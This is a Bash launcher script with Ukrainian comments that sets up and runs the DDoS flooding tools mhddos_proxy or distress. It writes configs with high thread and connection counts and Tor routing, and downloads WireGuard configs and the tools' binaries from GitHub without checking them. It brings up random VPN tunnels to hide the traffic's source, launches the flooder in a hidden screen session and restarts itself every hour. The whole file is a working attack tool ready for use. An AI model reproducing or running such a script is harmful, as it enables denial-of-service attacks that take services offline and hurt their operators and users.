#!/bin/bash

MODULE_DIR="modules"
WG_DIR="/etc/wireguard"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
SCRIPT_PATH="$(realpath "$0")"

#=== Створення конфігів .ini при відсутності ===
echo "[+] Перевірка конфігів .ini..."
INI1="$MODULE_DIR/mhddos.ini"
INI2="$MODULE_DIR/distress.ini"

mkdir -p "$MODULE_DIR"

if [ ! -f "$INI1" ]; then
  echo "--use-my-ip=0 -t 8000 --copies auto --user-id=" > "$INI1"
  echo "[+] Створено mhddos.ini"
fi

if [ ! -f "$INI2" ]; then
  echo "--use-my-ip 0 -c 40000 --use-tor 10 --user-id=" > "$INI2"
  echo "[+] Створено distress.ini"
fi

#=== Запит на user-id ===
if grep -q -- "--user-id=$" "$INI1" || grep -q -- "--user-id=$" "$INI2"; then
    read -p "[?] Введіть ваш user-id: " USER_ID
    if [[ -n "$USER_ID" ]]; then
        sed -i "s/--user-id=\$/--user-id=$USER_ID/" "$INI1" 2>/dev/null
        sed -i "s/--user-id=\$/--user-id=$USER_ID/" "$INI2" 2>/dev/null
        echo "[+] ID встановлено до конфігів."
    else
        echo "[-] ID не введено. Конфіги залишаються незмінні."
    fi
fi

#=== Завантаження WG-конфігів з GitHub (через wget) ===
echo "[+] Завантаження WG-конфігів з GitHub (через wget)..."
mkdir -p "$WG_DIR"

CONF_LIST=$(curl -s "$WG_REPO_HTML" |
  grep -oP '(?<=href=").*?\.conf(?=")' |
  grep '/k7771/Kaljan747/blob/' |
  sed 's|^/|https://github.com/|g' |
  sed 's|blob/|raw/|' |
  sed "s|https://github.com/k7771/Kaljan747/raw/k7771/wg/|$WG_RAW_BASE/|g" |
  grep -E '\.conf$')

for url in $CONF_LIST; do
    file=$(basename "$url")
    if [[ "$file" =~ ^[a-zA-Z0-9._-]+\.conf$ ]]; then
        wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file"
    else
        echo "[-] Пропущено (некоректне ім'я): $file"
    fi
done

chmod 600 "$WG_DIR"/*.conf 2>/dev/null

# Перевірка: чи є завантажені конфіги
if ! compgen -G "$WG_DIR/*.conf" > /dev/null; then
    echo "[-] Жодного .conf файлу не завантажено! Перевірте репозиторій або інтернет-з'єднання."
    exit 1
fi

#=== Зупинка попередніх WG-тунелів ===
echo "[+] Вимкнення попередніх WG-тунелів..."
ACTIVE_WG=$(wg show interfaces 2>/dev/null)
for iface in $ACTIVE_WG; do
    sudo wg-quick down "$iface" && echo "[-] Вимкнено: $iface"
done

#=== Завантаження модулів ===
echo "[+] Перевірка наявності модулів..."
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl

#=== Рандомний вибір WG-конфігів і запуск ===
echo "[+] Випадковий вибір 4 WireGuard конфігів з $WG_DIR..."
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
WG_IFACES=()

for conf in "${WG_FILES[@]}"; do
    sudo wg-quick up "$conf" || echo "[-] Не вдалося підключити $conf"
    iface=$(basename "$conf" .conf)
    WG_IFACES+=("$iface")
done

#=== Вибір модуля ===
CONFIG_CHOICE_FILE="last_module_choice.txt"
INTERACTIVE=false

# Якщо перший запуск
if [[ ! -f "$CONFIG_CHOICE_FILE" ]]; then
    echo "[?] Виберіть модуль:"
    echo "1 - mhddos_proxy"
    echo "2 - distress"
    read -p "[1/2]: " module_choice
    echo "$module_choice" > "$CONFIG_CHOICE_FILE"
    INTERACTIVE=true
else
    module_choice=$(cat "$CONFIG_CHOICE_FILE")
fi

case $module_choice in
    1)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        ;;
    2)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        ;;
    *)
        echo "[-] Невірний вибір модуля"
        exit 1
        ;;
esac

#=== Додавання WG-інтерфейсів до конфігів ===
if [[ "$module_choice" == "1" ]]; then
    echo "[+] Додавання WireGuard інтерфейсів до mhddos.ini..."
    grep -v "^--ifaces" "$CONFIG_FILE" 2>/dev/null > "$CONFIG_FILE.tmp" || touch "$CONFIG_FILE.tmp"
    echo -n "--ifaces " >> "$CONFIG_FILE.tmp"
    echo "${WG_IFACES[*]}" >> "$CONFIG_FILE.tmp"
    mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
elif [[ "$module_choice" == "2" ]]; then
    echo "[+] Додавання WireGuard інтерфейсів до distress.ini..."
    grep -v "^--interface" "$CONFIG_FILE" 2>/dev/null > "$CONFIG_FILE.tmp" || touch "$CONFIG_FILE.tmp"
    echo -n "--interface " >> "$CONFIG_FILE.tmp"
    echo "${WG_IFACES[*]}" | tr ' ' ',' >> "$CONFIG_FILE.tmp"
    mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
fi

#=== Налаштування параметрів модуля ===
echo "[+] Використання параметрів із $CONFIG_FILE"
ARGS=$(cat "$CONFIG_FILE")

#=== Вибір способу запуску ===
echo "[?] Виберіть спосіб запуску:"
echo "1 - screen у фоні"
echo "2 - screen з виводом"
echo "3 - без screen у поточному терміналі"
run_mode=1  # Автоматичний запуск у screen без запиту

ARGS=$(cat "$CONFIG_FILE")

if [[ $run_mode == "1" ]]; then
    screen -dmS "$MODULE_NAME" $MODULE $ARGS
    echo "[+] $MODULE_NAME запущено у screen (фон)."
elif [[ $run_mode == "2" ]]; then
    echo "[+] Запуск $MODULE_NAME у screen з виводом..."
    screen -S "$MODULE_NAME" $MODULE $ARGS
elif [[ $run_mode == "3" ]]; then
    echo "[+] Запуск $MODULE_NAME без screen у цьому терміналі..."
    $MODULE $ARGS
else
    echo "[-] Невірний вибір запуску."
    exit 1
fi

#=== Автоматичний перезапуск скрипта щогодини ===
echo "[+] Автоматичний перезапуск через 1 годину..."
sleep $(($(date -d 'next hour' +%s) - $(date +%s) - 60)) && exec "$SCRIPT_PATH" &
